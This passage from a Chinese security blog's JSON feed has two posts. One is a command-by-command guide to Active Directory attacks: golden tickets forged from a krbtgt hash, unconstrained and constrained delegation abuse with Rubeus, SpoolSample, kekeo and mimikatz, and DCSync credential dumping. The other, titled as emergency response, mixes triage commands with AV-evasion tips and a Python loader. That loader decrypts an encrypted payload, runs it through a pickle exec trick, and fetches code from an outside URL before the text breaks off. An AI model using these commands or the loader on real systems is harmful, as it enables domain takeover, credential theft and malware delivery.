plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell copy 2.exe \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p>伪造 host 服务，进行创建计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell asktgs.exe administrator.kirbi host/DC.hack.com</span><br></pre></td></tr></table></figure>\n<p>将票据注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell kirbikator.exe lsa host.DC.hack.com.kirbi</span><br></pre></td></tr></table></figure>\n<p>创建计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\\1.exe /ru system /f</span><br></pre></td></tr></table></figure>\n<p>执行计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用krbtgt哈希值获取目标域\"><a class=\"markdownIt-Anchor\" href=\"#利用krbtgt哈希值获取目标域\">#</a> <strong>利用 krbtgt 哈希值获取目标域</strong></h3>\n<p>获取 Krbtgt 散列</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure>\n<p>获取关键信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::trust /patch</span><br></pre></td></tr></table></figure>\n<p>构造并注入黄金票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Kerberos::golden /user:administrator /domain:当前域名 /sid:当前SID /sids:目标域SID-</span><br><span class=\"line\">519 /krbtgt:krbtgt散列 /ptt Kerberos::golden /user:administrator /domain:abc.hack.com /sid:S-1-5-21-2902250016-280749999-3752131090 /sids:S-1-5-21-2716900768-72748719-3475352185-519 /krbtgt:96d6714b1995e9d724a88ada46e9f30f /ptt</span><br></pre></td></tr></table></figure>\n<p>访问目标域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<h3 id=\"域内委派攻击概述\"><a class=\"markdownIt-Anchor\" href=\"#域内委派攻击概述\">#</a> <strong>域内委派攻击概述</strong></h3>\n<p>域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。委派是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种：</p>\n<p>1、非约束性委派</p>\n<p>2、约束性委派</p>\n<p>3、基于资源的约束性委派</p>\n<p>一个域内用户访问 WEB 服务，但是一些资源在文件服务上，这个时候就需要委派攻击</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219145249494.png\" alt=\"image-20221219145249494\"></p>\n<p>在域内只有主机账号和服务账号才有委派属性</p>\n<p>主机账号：活动目录中的 computers 组内的计算机，也被称为机器账号。</p>\n<p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL 等；域用户通过注册 SPN 也能成为服务账号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net user test123 Admin@123 /add /domain 创建一个普通用户</span><br><span class=\"line\">setspn -U -A priv/test test123 注册为服务账号</span><br></pre></td></tr></table></figure>\n<h3 id=\"非约束委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#非约束委派攻击\">#</a> <strong>非约束委派攻击</strong></h3>\n<p><strong>利用非约束委派域控主动访问控制域</strong></p>\n<p>1、使用 Adfifind 查询域内非约束委派机器账号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>\n<p>查询具有委派的服务账号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)</span><br><span class=\"line\">(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure>\n<p>3、这个时候如果域管访问了 pc-web 机器我们的内存中就会有域管的 TGT，就可以访问任意机器了，在</p>\n<p>与域控上执行访问 PC-WEB (在域控上执行)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\PC-WEB.HACK.COM /user:hack\\administrator Admin@123</span><br></pre></td></tr></table></figure>\n<p>4、去 pc-web 导出内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>\n<p>4、进行票据传递就可以获取域控的权限了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt [0;54acdf]-2-0-60a10000-Administrator@krbtgt\u0002HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n<p>5、访问域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell dir \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p><strong>利用非约束委派域控被动访问控制域控</strong></p>\n<p>控制了域内的一台机器 OA，并且该机器的服务账号配置了非约束委派，如下：一般域管不会主动访问我们，我们可以 利用 Windows 打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRNRpcRemoteFindFirstPrinterChangeNotification (Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。非约束性委派主机结合 Spooler 打印机服务漏洞，让域控机器 DC 强制访问已控的具有本地管理员权限的非约束性委派机器 OA ，从而拿到域管理员的 TGT，进而接管域控。（2008 机器可能复现不了，因为版本的问题）</p>\n<p>进行实验之前一定要把所有的防火墙关闭</p>\n<p>1、首先利用 Rubeus 在 OA 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器 DC 的登录信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Rubeus.exe monitor /interval:1 /filteruser: DC$</span><br></pre></td></tr></table></figure>\n<p>再利用 SpoolSample 强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SpoolSample.exe DC OA</span><br></pre></td></tr></table></figure>\n<p>Rubeus 导入票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Rubeus.exe ptt /ticket:票据</span><br></pre></td></tr></table></figure>\n<p>获取域内用户的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /all /csv</span><br></pre></td></tr></table></figure>\n<h3 id=\"约束性委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#约束性委派攻击\">#</a> <strong>约束性委派攻击</strong></h3>\n<p>当这个用户不在域内，他在出差，不能使用 kerberos 去认证，只能使用其他协议认证 web 系统，那同样 WEB 系统也需要访问文件服务的资源，这个时候如何认证呢</p>\n<p>Widnows Server 2003 之后微软引入了非约束委派。由于非约束委派的不安全性或者场景受限（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软于 2007 年为 Kerberos 协议进行扩展引入 S4U (service for user) 协议，该协议分为两个子协议</p>\n<p>1、S4u2self（Service for User to Self）</p>\n<p>2、S4U2proxy（Service for User to Proxy）</p>\n<p>这两个扩展都允许服务代表用户从 KDC 请求票证</p>\n<p>约束委派限制了 S4U2proxy 协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的其他服务</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219171904181.png\" alt=\"image-20221219171904181\"></p>\n<p>存在的问题</p>\n<p>1、服务账号 B 可以代表 A 申请访问 B 的票据，那么可不可以代表域管申请域管访问 B 的票据呢？在这个过程中，不需要域管参与，服务 B 自身就可以完成</p>\n<p>2、服务账号 B 可以代表 A 申请访问 C 的票据，那么可不可以代表域管申请域管访问 C 的票据呢？在这个过程中，不需要域管参与，服务 B 自身就可以完成</p>\n<p><strong>约束性委派攻击流程</strong></p>\n<p>用户（A）访问 WEB 系统（B）,B 代表 A 去向 KDC 申请访问 B 的 TGT 和 ST1 (使用 S4u2self), 用户 A 拿到了 ST1 就可以访问 B 了，如果在 B 上配置了约束性委派（A 到 C 的约束委派），则 B 能够使用 S4U2Proxy 协议将用户发给自己的可转发的 ST1 票据以用户的身份发给 KDC,KDC 返回 B 一个访问 C 的票据 ST2，这样 B 就可以以用户的身份访问 C</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219172826955.png\" alt=\"image-20221219172826955\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.通过NTLM或者其他认证</span><br><span class=\"line\">2.B代表A申请A访问B的票据(TGT和ST1)</span><br><span class=\"line\">3.KDC返回用户的TGT和ST1票据给B</span><br><span class=\"line\">4.B把ST1票据给A</span><br><span class=\"line\">5.A用ST1去访问B</span><br><span class=\"line\">6.B拿着A的ST1作为证据，去申请访问C的ST2</span><br><span class=\"line\">7.B用ST2票据访问C</span><br></pre></td></tr></table></figure>\n<p>伪造 A 的 TGT，向 KDC 申请 ST1，有了 ST1，可以使用 ST1 申请配置了对应服务的 ST2</p>\n<p>我们已经控制了 ZS 的电脑，发现该电脑配置了约束性的委派，并且可以读取到该电脑的机器用户的 HASH 值</p>\n<p>1、查询约束性委派的机器和用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查询约束委派机器账户</span><br><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br><span class=\"line\">查询约束委派服务账户</span><br><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>\n<p>2、使用 mimikatz 获取机器账户 NTLM Hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n<p>3、使用 kekeo 申请配置了约束委派机器账户 PC-ZS$ 的 TGT</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kekeo &quot;tgt::ask /user:PC-ZS$ /NTLM:bd41aace231471169d848817a2c46178 /domain:hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n<p>利用 TGT 通过伪造 S4U 请求以 administrator 身份访问 PC-ZS 的 ST</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kekeo &quot;tgs::s4u /tgt:TGT_PC-ZS$@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi /user:Administrator@hack.com /service:cifs/dc.hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n<p>mimkatz 注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt TGS_Administrator@hack.com@HACK.COM_cifs~dc.hack.com@HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/27/emergency%20response/",
            "url": "http://example.com/2022/05/27/emergency%20response/",
            "title": "应急响应",
            "date_published": "2022-05-27T05:38:45.000Z",
            "content_html": "<h1 id=\"emergency-response\"><a class=\"markdownIt-Anchor\" href=\"#emergency-response\">#</a> emergency response</h1>\n<h2 id=\"入侵排查\"><a class=\"markdownIt-Anchor\" href=\"#入侵排查\">#</a> 入侵排查</h2>\n<h3 id=\"windows\"><a class=\"markdownIt-Anchor\" href=\"#windows\">#</a> Windows</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.生成msf木马</span><br><span class=\"line\">msfvenom -p LHOST LPORT -f</span><br><span class=\"line\"></span><br><span class=\"line\">2.监听</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload </span><br><span class=\"line\">set lohost</span><br><span class=\"line\">set lport</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>msf 中可以在网络链接中找到，但任务管理器找不到</p>\n</blockquote>\n<h4 id=\"端口\"><a class=\"markdownIt-Anchor\" href=\"#端口\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;netstat -ano | findstr &quot;ESTABLISH&quot;</span><br><span class=\"line\">  TCP    10.128.50.84:49893     42.81.179.166:80       ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49898     42.81.193.250:443      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49919     103.212.12.39:3000     ESTABLISHED     2208</span><br><span class=\"line\">  TCP    10.128.50.84:57229     119.3.227.186:11113    ESTABLISHED     35024</span><br><span class=\"line\">  TCP    10.128.50.84:57357     113.142.50.195:443     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57413     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57462     117.62.242.202:80      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:57464     120.133.59.142:443     ESTABLISHED     6056</span><br><span class=\"line\">  TCP    10.128.50.84:57474     120.133.59.142:443     ESTABLISHED     6484</span><br><span class=\"line\">  TCP    10.128.50.84:57483     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:59370     101.89.15.105:443      ESTABLISHED     33384</span><br><span class=\"line\">  TCP    10.128.50.84:59493     20.198.162.76:443      ESTABLISHED     11804</span><br><span class=\"line\">  TCP    10.128.50.84:59899     150.158.219.208:443    ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63118     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63177     20.197.71.89:443       ESTABLISHED     11804</span><br></pre></td></tr></table></figure>\n<h4 id=\"进程\"><a class=\"markdownIt-Anchor\" href=\"#进程\">#</a> 进程</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;tasklist /svc | findstr 2208</span><br><span class=\"line\">LenovoInternetSoftwareFra     2208 暂缺</span><br></pre></td></tr></table></figure>\n<p>软件查杀</p>\n<blockquote>\n<p>PCHunter</p>\n<p>分析进程，分析签名，corporation 等</p>\n<p>火绒剑<br>\n process，autorun</p>\n<p>Process Monitor</p>\n</blockquote>\n<p>删除进程</p>\n<blockquote>\n<p>taskkill /F /T /PID 2208</p>\n<p>参数列表:</p>\n<pre><code>/S    system           指定要连接的远程系统。\n\n/U    [domain\\]user    指定应该在哪个用户上下文执行这个命令。\n\n/P    [password]       为提供的用户上下文指定密码。如果忽略，提示\n                       输入。\n\n/FI   filter           应用筛选器以选择一组任务。\n                       允许使用 &quot;*&quot;。例如，映像名称 eq acme*\n\n/PID  processid        指定要终止的进程的 PID。\n                       使用 TaskList 取得 PID。\n\n/IM   imagename        指定要终止的进程的映像名称。通配符 '*'可用来\n                       指定所有任务或映像名称。\n\n/T                     终止指定的进程和由它启用的子进程。\n\n/F                     指定强制终止进程。\n\n/?                     显示帮助消息。\n</code></pre>\n</blockquote>\n<p>找一些小众的 C2 框架，提升过免杀的概率</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTk3NzY3\">https://cloud.tencent.com/developer/article/1597767</span></p>\n<p>CS 上线</p>\n<blockquote>\n<p>netstat 中开始没有 cs 的连接，只有当 cs 中发出命令时才会建立连接，并且服务器发完命令立刻中断连接</p>\n<p>建立连接时间为 sleep</p>\n<p>因为受害者和攻击者通过中间的 teamserver 建立连接</p>\n</blockquote>\n<p>找进程</p>\n<blockquote>\n<p>tasklist  前提是没有注入进程</p>\n<p>注入进程后使用工具</p>\n</blockquote>\n<p>免杀通过 rc4 加密，比 aes 更好</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import pickle as json</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">import urllib.request</span><br><span class=\"line\">import codecs</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"># pick = &quot;&quot;&quot;</span><br><span class=\"line\"># json.loads(base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;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&#x27;</span><br><span class=\"line\"># )))))</span><br><span class=\"line\"># &quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># res = base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;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&#x27;</span><br><span class=\"line\"># ))))</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">#</span><br><span class=\"line\"># class A(object):</span><br><span class=\"line\">#     def __reduce__(self):</span><br><span class=\"line\">#         return (exec, (pick,))</span><br><span class=\"line\"># ret = json.dumps(A())</span><br><span class=\"line\"># print(ret)</span><br><span class=\"line\"># res = base64.b64encode(ret)</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">html=urllib.request.urlopen(&#x27;http://i.miaosu.bid/data/f_41570228.gif&#x27;).read()[7:]</span><br><span class=\"line\">html = 